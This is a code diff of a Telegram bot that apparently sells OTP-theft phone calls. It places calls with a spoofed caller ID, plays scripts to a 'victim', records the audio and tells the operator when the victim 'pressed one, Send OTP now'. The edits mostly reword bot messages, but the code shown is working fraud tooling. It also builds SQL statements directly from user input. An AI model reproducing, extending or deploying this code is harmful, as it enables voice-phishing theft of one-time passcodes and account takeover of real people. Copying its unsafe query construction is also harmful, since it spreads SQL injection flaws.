@@ -643,7 +643,9 @@ def Set_custom(message):
                       namee = i[2]
                       scr_id  = i[1]
                       txt = txt + f'{namee}:{scr_id} \n'
-                  bot.send_message(id,f"*--Your Scripts-- \n {txt}*",parse_mode='markdown')
+                  bot.send_message(id,f"""Your Scripts ⏬
+
+{txt}""",parse_mode='markdown')
               except:
                       bot.send_message(id,f"*Create any Script.*",parse_mode='markdown')
           elif days==0:  
@@ -788,7 +790,7 @@ def retrive_recording(rec_url,chatid):
                 response = requests.get(rec_url)
                 payload = {
                     'chat_id': {chatid},
-                    'title': 'articuno-voice.mp3',
+                    'title': 'ArticunoOTP.mp3',
                     'parse_mode': 'HTML'
                 }
                 files = {
@@ -810,7 +812,7 @@ def callhangbutton(userid):
     keyboard = types.InlineKeyboardMarkup(row_width=2)
     item1 = types.InlineKeyboardButton(text="End Call", callback_data="/endcall") 
     keyboard.add(item1)    
-    bot.send_message(userid, f"*Call Ringing 📞*", reply_markup=keyboard , parse_mode='markdown')
+    bot.send_message(userid, f"*Call is ringing 📞*", reply_markup=keyboard , parse_mode='markdown')
 
 
 def callmaking(number,spoof,chatid,service):
@@ -867,7 +869,7 @@ def recall_now(message):
                 caller=cl[5]
                 vict=cl[4]
                 if days>=1:
-                        bot.send_message(message.from_user.id, "*Recalling 📳*",parse_mode='markdown')
+                        bot.send_message(message.from_user.id, "*Remaking your last call 📳*",parse_mode='markdown')
                         try: 
                             c.execute(f"select * from call_data where chat_id={id} limit 1")
                             last_script = c.fetchone()
@@ -969,7 +971,7 @@ def custom_prebuild_script_call(script_id,chatid):
     "maxdigits":"1"
 }
             requests.post(url1, json=data)
-            bot.send_message(chatid,f"""*Call Answerd 🗣️*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*Call has been answered 🗣️*""",parse_mode='markdown')
 
         
 
@@ -1030,8 +1032,7 @@ def custom_prebuild_script_call(script_id,chatid):
 }
                 requests.post(url3, json=data)
             def custom_send_ask_otp(): 
-                bot.send_message(chatid,f"""*Victim Presses One 😈
-Send Your Code 📲*""",parse_mode='markdown')
+                bot.send_message(chatid,f"""*Victim pressed one, Send OTP now 📲*""",parse_mode='markdown')
             custom_bgtask2 = threading.Thread(target=custom_ask_otp)
 
             custom_bgtask2.start()
@@ -1320,13 +1321,14 @@ def make_call_custon(message):
     if row!=None :
         if row[3]!='ban':
             if user_day_check(id)>0:
-                    bot.send_message(message.from_user.id,f"*Call Initiated 🧭*""",parse_mode='markdown')
                     mes =(message.text).split()
                     try:
                         number = mes[1]
                         spoof = mes[2]
                         script_id = mes[3]
                         voice = mes[4]
+                        bot.send_message(message.from_user.id,f"""*⏱ Call Initiated from {spoof} to {number}
+Please wait verifying your inputes 🧑‍💻*""",parse_mode='markdown')
                         days =user_day_check(id)
                         c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
                         db.commit()
@@ -1506,14 +1508,6 @@ def delete():
     resp =  delete_data(int(userid))
     response_data = {'Response': f'{resp}'}
     return jsonify(response_data)
-
-
-# @app.route('/balance', methods=['POST','GET'])
-# def balance():
-
-#     return jsonify(response_data)
-
-
 
 
 @app.route('/announce', methods=['POST','GET'])
